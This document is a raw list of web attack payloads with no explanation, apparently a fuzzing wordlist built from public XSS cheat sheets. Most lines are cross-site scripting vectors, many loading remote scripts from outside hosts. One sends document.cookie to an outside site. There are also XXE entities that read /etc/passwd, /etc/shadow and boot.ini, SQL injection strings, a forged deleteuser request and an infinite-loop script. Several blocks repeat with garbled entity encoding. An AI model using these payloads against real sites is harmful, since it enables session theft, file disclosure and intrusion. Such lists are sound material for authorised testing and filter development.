&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=&quot;>&apos;>&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;h&#x0A;tt&#09;p://6&amp;#09;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;javascript:document.location=&apos;http://www.google.com/&apos;&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;
<script>document.vulnerable=true;</script>
<img SRC="jav ascript:document.vulnerable=true;">
<img SRC="javascript:document.vulnerable=true;">
<img SRC=" &#14; javascript:document.vulnerable=true;">
<body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;>
<<SCRIPT>document.vulnerable=true;//<</SCRIPT>
<script <B>document.vulnerable=true;</script>
<img SRC="javascript:document.vulnerable=true;"
<iframe src="javascript:document.vulnerable=true; <
<script>a=/XSS/\ndocument.vulnerable=true;</script>
\";document.vulnerable=true;;//
</title><SCRIPT>document.vulnerable=true;</script>
<input TYPE="IMAGE" SRC="javascript:document.vulnerable=true;">
<body BACKGROUND="javascript:document.vulnerable=true;">
<body ONLOAD=document.vulnerable=true;>
<img DYNSRC="javascript:document.vulnerable=true;">
<img LOWSRC="javascript:document.vulnerable=true;">
<bgsound SRC="javascript:document.vulnerable=true;">
<br SIZE="&{document.vulnerable=true}">
<LAYER SRC="javascript:document.vulnerable=true;"></LAYER>
<link REL="stylesheet" HREF="javascript:document.vulnerable=true;">
<style>li {list-style-image: url("javascript:document.vulnerable=true;");</STYLE><UL><LI>XSS
<img SRC='vbscript:document.vulnerable=true;'>
1script3document.vulnerable=true;1/script3
<meta HTTP-EQUIV="refresh" CONTENT="0;url=javascript:document.vulnerable=true;">
<meta HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:document.vulnerable=true;">
<IFRAME SRC="javascript:document.vulnerable=true;"></iframe>
<FRAMESET><FRAME SRC="javascript:document.vulnerable=true;"></frameset>
<table BACKGROUND="javascript:document.vulnerable=true;">
<table><TD BACKGROUND="javascript:document.vulnerable=true;">
<div STYLE="background-image: url(javascript:document.vulnerable=true;)">
<div STYLE="background-image: url(&#1;javascript:document.vulnerable=true;)">
<div STYLE="width: expression(document.vulnerable=true);">
<style>@im\port'\ja\vasc\ript:document.vulnerable=true';</style>
<img STYLE="xss:expr/*XSS*/ession(document.vulnerable=true)">
<XSS STYLE="xss:expression(document.vulnerable=true)">
exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>
<style TYPE="text/javascript">document.vulnerable=true;</style>
<style>.XSS{background-image:url("javascript:document.vulnerable=true");}</STYLE><A CLASS=XSS></a>
<style type="text/css">BODY{background:url("javascript:document.vulnerable=true")}</style>
<!--[if gte IE 4]><SCRIPT>document.vulnerable=true;</SCRIPT><![endif]-->
<base HREF="javascript:document.vulnerable=true;//">
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></object>
<XML ID=I><X><C><![<IMG SRC="javas]]<![cript:document.vulnerable=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></span>
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:document.vulnerable=true"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></span>
<html><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>"></BODY></html>
<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>
<meta HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.vulnerable=true</SCRIPT>">
<head><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-
<a href="javascript#document.vulnerable=true;">
<div onmouseover="document.vulnerable=true;">
<img src="javascript:document.vulnerable=true;">
<img dynsrc="javascript:document.vulnerable=true;">
<input type="image" dynsrc="javascript:document.vulnerable=true;">
<bgsound src="javascript:document.vulnerable=true;">
&<script>document.vulnerable=true;</script>
&{document.vulnerable=true;};
<img src=&{document.vulnerable=true;};>
<link rel="stylesheet" href="javascript:document.vulnerable=true;">
<iframe src="vbscript:document.vulnerable=true;">
<img src="mocha:document.vulnerable=true;">
<img src="livescript:document.vulnerable=true;">
<a href="about:<script>document.vulnerable=true;</script>">
<meta http-equiv="refresh" content="0;url=javascript:document.vulnerable=true;">
<body onload="document.vulnerable=true;">
<div style="background-image: url(javascript:document.vulnerable=true;);">
<div style="behaviour: url([link to code]);">
<div style="binding: url([link to code]);">
<div style="width: expression(document.vulnerable=true;);">
<style type="text/javascript">document.vulnerable=true;</style>
<object classid="clsid:..." codebase="javascript:document.vulnerable=true;">
<style><!--</style><script>document.vulnerable=true;//--></script>
<<script>document.vulnerable=true;</script>
<![<!--]]<script>document.vulnerable=true;//--></script>
<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->
<img src="blah"onmouseover="document.vulnerable=true;">
<img src="blah>" onmouseover="document.vulnerable=true;">
<xml src="javascript:document.vulnerable=true;">
<xml id="X"><a><b><script>document.vulnerable=true;</script>;</b></a></xml>
<div datafld="b" dataformatas="html" datasrc="#X"></div>
[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>
<style>@import'http://www.securitycompass.com/xss.css';</style>
<meta HTTP-EQUIV="Link" Content="<http://www.securitycompass.com/xss.css>; REL=stylesheet">
<style>BODY{-moz-binding:url("http://www.securitycompass.com/xssmoz.xml#xss")}</style>
<OBJECT TYPE="text/x-scriptlet" DATA="http://www.securitycompass.com/scriptlet.html"></object>
<HTML xmlns:xss><?import namespace="xss" implementation="http://www.securitycompass.com/xss.htc"><xss:xss>XSS</xss:xss></html>
<script SRC="http://www.securitycompass.com/xss.jpg"></script>
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'"-->
<script a=">" SRC="http://www.securitycompass.com/xss.js"></script>
<script =">" SRC="http://www.securitycompass.com/xss.js"></script>
<script a=">" '' SRC="http://www.securitycompass.com/xss.js"></script>
<script "a='>'" SRC="http://www.securitycompass.com/xss.js"></script>
<script a=`>` SRC="http://www.securitycompass.com/xss.js"></script>
<script a=">'>" SRC="http://www.securitycompass.com/xss.js"></script>
<script>document.write("<SCRI");</SCRIPT>PT SRC="http://www.securitycompass.com/xss.js"></script>
<div style="binding: url(http://www.securitycompass.com/xss.js);"> [Mozilla]
&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
&lt;/br style=a:expression(alert())&gt;
&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;
&lt;br size=\&quot;&amp;{alert(&#039;XSS&#039;)}\&quot;&gt;
perl -e &#039;print \&quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;\&quot;;&#039; &gt; out
perl -e &#039;print \&quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;\&quot;;&#039; &gt; out
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
<~/XSS/*-*/STYLE=xss:e/**/xpression(window.location="http://www.procheckup.com/?sid="%2bdocument.cookie)>
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
<~/XSS STYLE=xss:expression(alert('XSS'))>
"><script>alert('XSS')</script>
</XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
XSS STYLE=xss:e/**/xpression(alert('XSS'))>
</XSS STYLE=xss:expression(alert('XSS'))>
';;alert(String.fromCharCode(88,83,83))//\';;alert(String.fromCharCode(88,83,83))//";;alert(String.fromCharCode(88,83,83))//\";;alert(String.fromCharCode(88,83,83))//-->;<;/SCRIPT>;";>;';>;<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;
';';;!--";<;XSS>;=&;{()}
<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;
<;SCRIPT SRC=http://ha.ckers.org/xss.js>;<;/SCRIPT>;
<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;
<;BASE HREF=";javascript:alert(';XSS';);//";>;
<;BGSOUND SRC=";javascript:alert(';XSS';);";>;
<;BODY BACKGROUND=";javascript:alert(';XSS';);";>;
<;BODY ONLOAD=alert(';XSS';)>;
<;DIV STYLE=";background-image: url(javascript:alert(';XSS';))";>;
<;DIV STYLE=";background-image: url(&;#1;javascript:alert(';XSS';))";>;
<;DIV STYLE=";width: expression(alert(';XSS';));";>;
<;FRAMESET>;<;FRAME SRC=";javascript:alert(';XSS';);";>;<;/FRAMESET>;
<;IFRAME SRC=";javascript:alert(';XSS';);";>;<;/IFRAME>;
<;INPUT TYPE=";IMAGE"; SRC=";javascript:alert(';XSS';);";>;
<;IMG SRC=";javascript:alert(';XSS';);";>;
<;IMG SRC=javascript:alert(';XSS';)>;
<;IMG DYNSRC=";javascript:alert(';XSS';);";>;
<;IMG LOWSRC=";javascript:alert(';XSS';);";>;
<;IMG SRC=";http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode";>;
Redirect 302 /a.jpg http://victimsite.com/admin.asp&;deleteuser
exp/*<;XSS STYLE=';no\xss:noxss(";*//*";);
<;STYLE>;li {list-style-image: url(";javascript:alert(&#39;XSS&#39;)";);}<;/STYLE>;<;UL>;<;LI>;XSS
<;IMG SRC=';vbscript:msgbox(";XSS";)';>;
<;LAYER SRC=";http://ha.ckers.org/scriptlet.html";>;<;/LAYER>;
<;IMG SRC=";livescript:[code]";>;
%BCscript%BEalert(%A2XSS%A2)%BC/script%BE
<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=javascript:alert(';XSS';);";>;
<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K";>;
<;META HTTP-EQUIV=";refresh"; CONTENT=";0; URL=http://;URL=javascript:alert(';XSS';);";>;
<;IMG SRC=";mocha:[code]";>;
<;OBJECT TYPE=";text/x-scriptlet"; DATA=";http://ha.ckers.org/scriptlet.html";>;<;/OBJECT>;
<;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:alert(';XSS';)>;<;/OBJECT>;
<;EMBED SRC=";http://ha.ckers.org/xss.swf"; AllowScriptAccess=";always";>;<;/EMBED>;
a=";get";;&;#10;b=";URL(";";;&;#10;c=";javascript:";;&;#10;d=";alert(';XSS';);";)";;&#10;eval(a+b+c+d);
<;STYLE TYPE=";text/javascript";>;alert(';XSS';);<;/STYLE>;
<;IMG STYLE=";xss:expr/*XSS*/ession(alert(';XSS';))";>;
<;XSS STYLE=";xss:expression(alert(';XSS';))";>;
<;STYLE>;.XSS{background-image:url(";javascript:alert(';XSS';)";);}<;/STYLE>;<;A CLASS=XSS>;<;/A>;
<;STYLE type=";text/css";>;BODY{background:url(";javascript:alert(';XSS';)";)}<;/STYLE>;
<;LINK REL=";stylesheet"; HREF=";javascript:alert(';XSS';);";>;
<;LINK REL=";stylesheet"; HREF=";http://ha.ckers.org/xss.css";>;
<;STYLE>;@import';http://ha.ckers.org/xss.css';;<;/STYLE>;
<;META HTTP-EQUIV=";Link"; Content=";<;http://ha.ckers.org/xss.css>;; REL=stylesheet";>;
<;STYLE>;BODY{-moz-binding:url(";http://ha.ckers.org/xssmoz.xml#xss";)}<;/STYLE>;
<;TABLE BACKGROUND=";javascript:alert(';XSS';)";>;<;/TABLE>;
<;TABLE>;<;TD BACKGROUND=";javascript:alert(';XSS';)";>;<;/TD>;<;/TABLE>;
<;HTML xmlns:xss>;
<;XML ID=I>;<;X>;<;C>;<;![CDATA[<;IMG SRC=";javas]]>;<;![CDATA[cript:alert(';XSS';);";>;]]>;
<;XML ID=";xss";>;<;I>;<;B>;<;IMG SRC=";javas<;!-- -->;cript:alert(';XSS';)";>;<;/B>;<;/I>;<;/XML>;
<;XML SRC=";http://ha.ckers.org/xsstest.xml"; ID=I>;<;/XML>;
<;HTML>;<;BODY>;
<;!--[if gte IE 4]>;           
<;META HTTP-EQUIV=";Set-Cookie"; Content=";USERID=<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;";>;
<;XSS STYLE=";behavior: url(http://ha.ckers.org/xss.htc);";>;
<;SCRIPT SRC=";http://ha.ckers.org/xss.jpg";>;<;/SCRIPT>;
<;!--#exec cmd=";/bin/echo ';<;SCRIPT SRC';";-->;<;!--#exec cmd=";/bin/echo ';=http://ha.ckers.org/xss.js>;<;/SCRIPT>;';";-->;
<;? echo(';<;SCR)';;
<;BR SIZE=";&;{alert(';XSS';)}";>;
<;IMG SRC=JaVaScRiPt:alert(';XSS';)>;
<;IMG SRC=javascript:alert(&;quot;XSS&;quot;)>;
<;IMG SRC=`javascript:alert(";RSnake says, ';XSS';";)`>;
<;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>;
<;IMG RC=&;#106;&;#97;&;#118;&;#97;&;#115;&;#99;&;#114;&;#105;&;#112;&;#116;&;#58;&;#97;&;#108;&;#101;&;#114;&;#116;&;#40;&;#39;&;#88;&;#83;&;#83;&;#39;&;#41;>;
<;IMG RC=&;#0000106&;#0000097&;#0000118&;#0000097&;#0000115&;#0000099&;#0000114&;#0000105&;#0000112&;#0000116&;#0000058&;#0000097&;#0000108&;#0000101&;#0000114&;#0000116&;#0000040&;#0000039&;#0000088&;#0000083&;#0000083&;#0000039&;#0000041>;
<;DIV STYLE=";background-image:\0075\0072\006C\0028';\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.10530053\0027\0029';\0029";>;
<;IMG SRC=&;#x6A&;#x61&;#x76&;#x61&;#x73&;#x63&;#x72&;#x69&;#x70&;#x74&;#x3A&;#x61&;#x6C&;#x65&;#x72&;#x74&;#x28&;#x27&;#x58&;#x53&;#x53&;#x27&;#x29>;
<;HEAD>;<;META HTTP-EQUIV=";CONTENT-TYPE"; CONTENT=";text/html; charset=UTF-7";>; <;/HEAD>;+ADw-SCRIPT+AD4-alert(';XSS';);+ADw-/SCRIPT+AD4-
\";;alert(';XSS';);//
<;/TITLE>;<;SCRIPT>;alert("XSS");<;/SCRIPT>;
<;STYLE>;@im\port';\ja\vasc\ript:alert(";XSS";)';;<;/STYLE>;
<;IMG SRC=";jav&#x09;ascript:alert(';XSS';);";>;
<;IMG SRC=";jav&;#x09;ascript:alert(';XSS';);";>;
<;IMG SRC=";jav&;#x0A;ascript:alert(';XSS';);";>;
<;IMG SRC=";jav&;#x0D;ascript:alert(';XSS';);";>;
<;IMG&#x0D;SRC&#x0D;=&#x0D;";&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;&#x0D;';&#x0D;X&#x0D;S&#x0D;S&#x0D;';&#x0D;)&#x0D;";&#x0D;>;&#x0D;
perl -e ';print ";<;IM SRC=java\0script:alert(";XSS";)>";;';>; out
perl -e ';print ";&;<;SCR\0IPT>;alert(";XSS";)<;/SCR\0IPT>;";;'; >; out
<;IMG SRC="; &;#14;  javascript:alert(';XSS';);";>;
<;SCRIPT/XSS SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>;
<;SCRIPT SRC=http://ha.ckers.org/xss.js
<;SCRIPT SRC=//ha.ckers.org/.j>;
<;IMG SRC=";javascript:alert(';XSS';)";
<;IFRAME SRC=http://ha.ckers.org/scriptlet.html <;
<;<;SCRIPT>;alert(";XSS";);//<;<;/SCRIPT>;
<;IMG ";";";>;<;SCRIPT>;alert(";XSS";)<;/SCRIPT>;";>;
<;SCRIPT>;a=/XSS/
<;SCRIPT a=";>;"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<;SCRIPT =";blah"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<;SCRIPT a=";blah"; ';'; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<;SCRIPT ";a=';>;';"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<;SCRIPT a=`>;` SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<;SCRIPT>;document.write(";<;SCRI";);<;/SCRIPT>;PT SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<;SCRIPT a=";>';>"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<;A HREF=";http://66.102.7.147/";>;XSS<;/A>;
<;A HREF=";http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D";>;XSS<;/A>;
<;A HREF=";http://1113982867/";>;XSS<;/A>;
<;A HREF=";http://0x42.0x0000066.0x7.0x93/";>;XSS<;/A>;
<;A HREF=";http://0102.0146.0007.00000223/";>;XSS<;/A>;
<;A HREF=";h&#x0A;tt&#09;p://6&;#09;6.000146.0x7.147/";>;XSS<;/A>;
<;A HREF=";//www.google.com/";>;XSS<;/A>;
<;A HREF=";//google";>;XSS<;/A>;
<;A HREF=";http://ha.ckers.org@google";>;XSS<;/A>;
<;A HREF=";http://google:ha.ckers.org";>;XSS<;/A>;
<;A HREF=";http://google.com/";>;XSS<;/A>;
<;A HREF=";http://www.google.com./";>;XSS<;/A>;
<;A HREF=";javascript:document.location=';http://www.google.com/';";>;XSS<;/A>;
<;A HREF=";http://www.gohttp://www.google.com/ogle.com/";>;XSS<;/A>;
<script>document.vulnerable=true;</script>
<img SRC="jav ascript:document.vulnerable=true;">
<img SRC="javascript:document.vulnerable=true;">
<img SRC=" &#14; javascript:document.vulnerable=true;">
<body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;>
<<SCRIPT>document.vulnerable=true;//<</SCRIPT>
<script <B>document.vulnerable=true;</script>
<img SRC="javascript:document.vulnerable=true;"
<iframe src="javascript:document.vulnerable=true; <
<script>a=/XSS/\ndocument.vulnerable=true;</script>
\";document.vulnerable=true;;//
</title><SCRIPT>document.vulnerable=true;</script>
<input TYPE="IMAGE" SRC="javascript:document.vulnerable=true;">
<body BACKGROUND="javascript:document.vulnerable=true;">
<body ONLOAD=document.vulnerable=true;>
<img DYNSRC="javascript:document.vulnerable=true;">
<img LOWSRC="javascript:document.vulnerable=true;">
<bgsound SRC="javascript:document.vulnerable=true;">
<br SIZE="&{document.vulnerable=true}">
<LAYER SRC="javascript:document.vulnerable=true;"></LAYER>
<link REL="stylesheet" HREF="javascript:document.vulnerable=true;">
<style>li {list-style-image: url("javascript:document.vulnerable=true;");</STYLE><UL><LI>XSS
<img SRC='vbscript:document.vulnerable=true;'>
1script3document.vulnerable=true;1/script3
<meta HTTP-EQUIV="refresh" CONTENT="0;url=javascript:document.vulnerable=true;">
<meta HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:document.vulnerable=true;">
<IFRAME SRC="javascript:document.vulnerable=true;"></iframe>
<FRAMESET><FRAME SRC="javascript:document.vulnerable=true;"></frameset>
<table BACKGROUND="javascript:document.vulnerable=true;">
<table><TD BACKGROUND="javascript:document.vulnerable=true;">
<div STYLE="background-image: url(javascript:document.vulnerable=true;)">
<div STYLE="background-image: url(&#1;javascript:document.vulnerable=true;)">
<div STYLE="width: expression(document.vulnerable=true);">
<style>@im\port'\ja\vasc\ript:document.vulnerable=true';</style>
<img STYLE="xss:expr/*XSS*/ession(document.vulnerable=true)">
<XSS STYLE="xss:expression(document.vulnerable=true)">
exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>
<style TYPE="text/javascript">document.vulnerable=true;</style>
<style>.XSS{background-image:url("javascript:document.vulnerable=true");}</STYLE><A CLASS=XSS></a>
<style type="text/css">BODY{background:url("javascript:document.vulnerable=true")}</style>
<!--[if gte IE 4]><SCRIPT>document.vulnerable=true;</SCRIPT><![endif]-->
<base HREF="javascript:document.vulnerable=true;//">
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></object>
<XML ID=I><X><C><![<IMG SRC="javas]]<![cript:document.vulnerable=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></span>
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:document.vulnerable=true"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></span>
<html><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>"></BODY></html>
<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>
<meta HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.vulnerable=true</SCRIPT>">
<head><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.vulnerable=true;+ADw-/SCRIPT+AD4-
<a href="javascript#document.vulnerable=true;">
<div onmouseover="document.vulnerable=true;">
<img src="javascript:document.vulnerable=true;">
<img dynsrc="javascript:document.vulnerable=true;">
<input type="image" dynsrc="javascript:document.vulnerable=true;">
<bgsound src="javascript:document.vulnerable=true;">
&<script>document.vulnerable=true;</script>
&{document.vulnerable=true;};
<img src=&{document.vulnerable=true;};>
<link rel="stylesheet" href="javascript:document.vulnerable=true;">
<iframe src="vbscript:document.vulnerable=true;">
<img src="mocha:document.vulnerable=true;">
<img src="livescript:document.vulnerable=true;">
<a href="about:<script>document.vulnerable=true;</script>">
<meta http-equiv="refresh" content="0;url=javascript:document.vulnerable=true;">
<body onload="document.vulnerable=true;">
<div style="background-image: url(javascript:document.vulnerable=true;);">
<div style="behaviour: url([link to code]);">
<div style="binding: url([link to code]);">
<div style="width: expression(document.vulnerable=true;);">
<style type="text/javascript">document.vulnerable=true;</style>
<object classid="clsid:..." codebase="javascript:document.vulnerable=true;">
<style><!--</style><script>document.vulnerable=true;//--></script>
<<script>document.vulnerable=true;</script>
<![<!--]]<script>document.vulnerable=true;//--></script>
<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->
<img src="blah"onmouseover="document.vulnerable=true;">
<img src="blah>" onmouseover="document.vulnerable=true;">
<xml src="javascript:document.vulnerable=true;">
<xml id="X"><a><b><script>document.vulnerable=true;</script>;</b></a></xml>
<div datafld="b" dataformatas="html" datasrc="#X"></div>
[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>
<style>@import'http://www.securitycompass.com/xss.css';</style>
<meta HTTP-EQUIV="Link" Content="<http://www.securitycompass.com/xss.css>; REL=stylesheet">
<style>BODY{-moz-binding:url("http://www.securitycompass.com/xssmoz.xml#xss")}</style>
<OBJECT TYPE="text/x-scriptlet" DATA="http://www.securitycompass.com/scriptlet.html"></object>
<HTML xmlns:xss><?import namespace="xss" implementation="http://www.securitycompass.com/xss.htc"><xss:xss>XSS</xss:xss></html>
<script SRC="http://www.securitycompass.com/xss.jpg"></script>
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://www.securitycompass.com/xss.js></SCRIPT>'"-->
<script a=">" SRC="http://www.securitycompass.com/xss.js"></script>
<script =">" SRC="http://www.securitycompass.com/xss.js"></script>
<script a=">" '' SRC="http://www.securitycompass.com/xss.js"></script>
<script "a='>'" SRC="http://www.securitycompass.com/xss.js"></script>
<script a=`>` SRC="http://www.securitycompass.com/xss.js"></script>
<script a=">'>" SRC="http://www.securitycompass.com/xss.js"></script>
<script>document.write("<SCRI");</SCRIPT>PT SRC="http://www.securitycompass.com/xss.js"></script>
<div style="binding: url(http://www.securitycompass.com/xss.js);"> [Mozilla]
";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>;
<;/script>;<;script>;alert(1)<;/script>;
<;/br style=a:expression(alert())>;
<;scrscriptipt>;alert(1)<;/scrscriptipt>;
<;br size=\";&;{alert(&#039;XSS&#039;)}\";>;
perl -e &#039;print \";<;IMG SRC=java\0script:alert(\";XSS\";)>;\";;&#039; >; out
perl -e &#039;print \";<;SCR\0IPT>;alert(\";XSS\";)<;/SCR\0IPT>;\";;&#039; >; out
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
<~/XSS/*-*/STYLE=xss:e/**/xpression(window.location="http://www.procheckup.com/?sid="%2bdocument.cookie)>
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
<~/XSS STYLE=xss:expression(alert('XSS'))>
"><script>alert('XSS')</script>
</XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
XSS STYLE=xss:e/**/xpression(alert('XSS'))>
</XSS STYLE=xss:expression(alert('XSS'))>
>"><script>alert("XSS")</script>&
"><STYLE>@import"javascript:alert('XSS')";</STYLE>
>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>
>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
'';!--"<XSS>=&{()}
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>
<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;&#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>
<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058&<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>    
<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28&<WBR>#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">
<IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">
<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xee;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xee;</foo>
